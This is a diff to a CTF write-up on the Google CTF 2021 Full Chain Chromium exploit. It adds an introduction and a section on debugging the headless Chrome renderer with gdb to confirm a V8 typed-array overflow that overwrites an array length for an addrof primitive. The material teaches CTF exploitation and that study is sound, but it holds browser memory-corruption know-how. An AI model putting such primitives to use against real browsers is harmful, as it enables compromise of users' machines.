@@ -1,3 +1,7 @@
+# Introduction
+
+The below writeup is one hacker's attempt to follow yudai's writeup for the Google CTF 2021 Full Chain challenge assuming little browser-exploit knowledge.
+
 # Fullchain
 
 Chromium is built from commit `1be58e78c7ec6603d416aed4dfae757334cd4e1e`. Linux is v5.12.9, you can download the sources from [here](https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.12.9.tar.xz). The VM is built from Debian.
@@ -118,8 +122,6 @@ Received signal 11 SEGV_ACCERR 2d7a512217ff
 [1024/092801.729053:ERROR:headless_shell.cc(423)] Abnormal renderer termination.
 ```
 
-TODO: Check this in d8
-
 An incomplete, simplistic view of memory and the corresponding javascript can be viewed below:
 ```javascript
 let x = new Uint32Array(8);
@@ -177,6 +179,64 @@ Running this proof-of-concept code results in the log output:
 ```
 
 v8 represents integer values in memory with small-integer (SMI) which is why `1111` appears instead of `2222`.
+
+### How to debug chrome?
+
+Let's verify our assumptions with a debugger. But how do we debug chrome?
+
+There are two things that make debugging problematic:
+1. The chrome process exits as soon as there is no more javascript code to execute.
+2. chrome has multiple processes and we need to attach to the correct process.
+
+To solve the first problem, we can introduce an infinite loop into the javascript code and execute a builtin function that we can break on. My knowledge on the JIT compiler is incomplete so we will hope that the loop will not alter the code unexpectedly.
+
+For example, we will add the following javascript to our POC:
+```javascript
+let i = 1;
+while (i < 10) {
+    x.set(y, 33);
+}
+```
+
+Now, the chrome process will remain running until we attach to it with a debugger.
+
+For the second problem, we can now check the process listing and search for the `renderer` flag in the process command-line.
+
+We can identify the renderer process with the `ps` command.
+```bash
+$ ps aux | grep chrome | grep render
+user        3115  100  1.9 21334356 78004 pts/1  Rl+  21:19   2:08 /home/user/Public/chromium/chrome --type=renderer --headless --lang=en-US --enable-logging=stderr --allow-pre-commit-input --ozone-platform=headless --field-trial-handle=4043824133009562662,633504045566236579,131072 --disable-features=PaintHolding --disable-gpu-compositing --lang=en-US --num-raster-threads=2 --enable-main-frame-before-activation --renderer-client-id=4 --shared-files=v8_context_snapshot_data:100
+```
+
+Then connect the debugger and break with `CTRL-C`.
+```bash
+$ gdb -q --pid 3115
+```
+
+On Linux, you may need to disable ptrace yama scope before attaching to the process.
+
+```bash
+# echo 0 > /proc/sys/kernel/yama/ptrace_scope
+```
+
+In our example of javascript code executed within the infinite loop `x.set(y, 33);`, we will probably break on the native function `Builtins_TypedArrayPrototypeSet`.
+
+Looking at the source code for this function, there is a call to `memmove` that we can break on to verify the source and destination pointers as well as the value being copied.
+
+```
+(gdb) b * libc_memmove
+(gdb) c
+(gdb) p/x $rdx
+$1 = 0x4
+(gdb) x/wx $rsi
+0x310d08048714:	0x000008ae
+(gdb) x/wx $rdi
+0x310d0804882c:	0x000008ae
+```
+
+From the output above, we can see that 4 bytes are copied from rsi to rdi and that the value that is copied is 0x8ae which is 2222.
+
+This confirms that we overwrote the length field of array z as mentioned above to achieve our addrof primitive!
 
 **arbitrary address primitives**
 
